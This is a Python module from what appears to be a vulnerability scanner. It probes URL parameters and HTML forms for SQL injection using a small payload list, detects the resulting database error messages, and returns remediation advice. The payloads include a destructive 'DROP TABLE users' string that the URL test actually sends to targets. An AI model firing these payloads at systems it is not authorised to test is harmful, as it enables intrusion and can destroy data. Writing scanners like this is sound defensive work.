"""
SQL Injection Check

Tests for SQL injection vulnerabilities using various payloads.
"""

import re
import time
from typing import Dict, Any, List

from atlas.checks.base import (
    VulnerabilityCheck, CheckMetadata, CheckResult, CheckStatus, Severity
)
from atlas.utils.logger import get_logger

logger = get_logger(__name__)


class SQLInjectionCheck(VulnerabilityCheck):
    """
    SQL Injection vulnerability check.
    
    Tests common injection points with error-based and
    boolean-based payloads (no heavy fuzzing).
    """
    
    @property
    def metadata(self) -> CheckMetadata:
        return CheckMetadata(
            id="sqli_basic",
            name="SQL Injection (Basic)",
            category="Injection",
            severity=Severity.HIGH,
            description="Tests for SQL injection vulnerabilities using error-based and boolean-based techniques",
            owasp_category="A03:2021 Injection",
            cwe_id="CWE-89",
            prerequisites=[],
            applicable_services=["http", "https", "http-alt"],
            tags=["sqli", "injection", "database"]
        )
    
    # Test payloads - minimal set to avoid heavy fuzzing
    PAYLOADS = [
        # Error-based
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "1' OR '1'='1' --",
        "1 OR 1=1",
        "' OR 1=1--",
        "1'; DROP TABLE users--",
        
        # Boolean-based
        "' AND '1'='1",
        "' AND '1'='2",
        
        # Time-based (careful - only for confirmation)
        "1' AND SLEEP(2)--",
    ]
    
    # SQL error patterns
    ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySqlException",
        r"valid MySQL result",
        r"PostgreSQL.*ERROR",
        r"Warning.*pg_",
        r"valid PostgreSQL result",
        r"Driver.*SQL Server",
        r"OLE DB.*SQL Server",
        r"SQLServer JDBC Driver",
        r"Microsoft SQL Native Client",
        r"ODBC SQL Server Driver",
        r"SQLite3::query",
        r"SQLite3::SQLException",
        r"ORA-\d{5}",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*oci_",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
        r"Unclosed quotation mark",
        r"syntax error at or near",
    ]
    
    async def execute(self, target: str, context: Dict[str, Any]) -> CheckResult:
        """Execute SQL injection check"""
        import httpx
        
        start_time = time.time()
        
        try:
            async with httpx.AsyncClient(timeout=15, verify=False, follow_redirects=True) as client:
                # Get baseline response
                baseline = await self._get_baseline(client, target)
                
                if not baseline:
                    return self._inconclusive(
                        description="Could not establish baseline response"
                    )
                
                # Test common injection points
                vulnerable_points = []
                
                # Test URL parameters
                param_results = await self._test_url_params(client, target, baseline)
                vulnerable_points.extend(param_results)
                
                # Test form inputs if applicable
                form_results = await self._test_forms(client, target, baseline)
                vulnerable_points.extend(form_results)
                
                execution_time = time.time() - start_time
                
                if vulnerable_points:
                    return self._vulnerable(
                        title="SQL Injection Vulnerability Detected",
                        description=f"Found {len(vulnerable_points)} potential SQL injection point(s)",
                        evidence=self._format_evidence(vulnerable_points),
                        remediation=self._get_remediation(),
                        url=target,
                        parameter=vulnerable_points[0].get("parameter"),
                        payload=vulnerable_points[0].get("payload"),
                        cvss_score=8.6,
                        execution_time=execution_time
                    )
                else:
                    return self._not_vulnerable(
                        description="No SQL injection vulnerabilities detected",
                        execution_time=execution_time
                    )
                    
        except Exception as e:
            logger.error(f"SQLi check error: {e}")
            return self._error(str(e))
    
    async def _get_baseline(self, client, target: str) -> Dict[str, Any]:
        """Get baseline response for comparison"""
        try:
            response = await client.get(target)
            return {
                "status": response.status_code,
                "length": len(response.text),
                "text": response.text[:5000]
            }
        except Exception:
            return None
    
    async def _test_url_params(self, client, target: str, baseline: Dict) -> List[Dict]:
        """Test URL parameters for injection"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        vulnerable = []
        parsed = urlparse(target)
        params = parse_qs(parsed.query)
        
        if not params:
            # Try adding a common parameter
            params = {"id": ["1"], "search": ["test"]}
        
        for param_name, values in params.items():
            original_value = values[0] if values else "1"
            
            for payload in self.PAYLOADS[:8]:  # Limit payloads
                test_params = params.copy()
                test_params[param_name] = [original_value + payload]
                
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                
                try:
                    response = await client.get(test_url)
                    
                    if self._check_sql_error(response.text):
                        vulnerable.append({
                            "type": "url_parameter",
                            "parameter": param_name,
                            "payload": payload,
                            "evidence": self._extract_error(response.text),
                            "url": test_url
                        })
                        break  # Found vuln, move to next param
                        
                except Exception:
                    continue
        
        return vulnerable
    
    async def _test_forms(self, client, target: str, baseline: Dict) -> List[Dict]:
        """Test form inputs for injection"""
        import re
        
        vulnerable = []
        
        try:
            response = await client.get(target)
            
            # Find forms in response
            form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>'
            input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>'
            
            forms = re.findall(form_pattern, response.text, re.IGNORECASE | re.DOTALL)
            
            for action, form_content in forms[:3]:  # Limit forms
                inputs = re.findall(input_pattern, form_content, re.IGNORECASE)
                
                if not inputs:
                    continue
                
                # Build form data
                form_data = {inp: "test" for inp in inputs}
                
                for input_name in inputs:
                    for payload in self.PAYLOADS[:5]:
                        test_data = form_data.copy()
                        test_data[input_name] = "test" + payload
                        
                        try:
                            # Resolve action URL
                            from urllib.parse import urljoin
                            form_url = urljoin(target, action) if action else target
                            
                            resp = await client.post(form_url, data=test_data)
                            
                            if self._check_sql_error(resp.text):
                                vulnerable.append({
                                    "type": "form_input",
                                    "parameter": input_name,
                                    "payload": payload,
                                    "evidence": self._extract_error(resp.text),
                                    "url": form_url
                                })
                                break
                                
                        except Exception:
                            continue
                            
        except Exception as e:
            logger.debug(f"Form testing error: {e}")
        
        return vulnerable
    
    def _check_sql_error(self, text: str) -> bool:
        """Check if response contains SQL error"""
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False
    
    def _extract_error(self, text: str) -> str:
        """Extract SQL error message from response"""
        for pattern in self.ERROR_PATTERNS:
            match = re.search(f".{{0,100}}{pattern}.{{0,100}}", text, re.IGNORECASE)
            if match:
                return match.group(0)[:200]
        return "SQL error detected"
    
    def _format_evidence(self, points: List[Dict]) -> str:
        """Format vulnerability evidence"""
        lines = []
        for i, point in enumerate(points, 1):
            lines.append(f"{i}. {point['type']}: {point['parameter']}")
            lines.append(f"   Payload: {point['payload']}")
            lines.append(f"   Evidence: {point['evidence'][:100]}")
        return "\n".join(lines)
    
    def _get_remediation(self) -> str:
        """Get remediation guidance"""
        return """
1. Use parameterized queries (prepared statements) for all database operations
2. Implement input validation using allowlists
3. Apply the principle of least privilege for database accounts
4. Use stored procedures where possible
5. Escape special characters if dynamic queries are unavoidable
6. Implement Web Application Firewall (WAF) rules
7. Enable database query logging for monitoring
        """.strip()
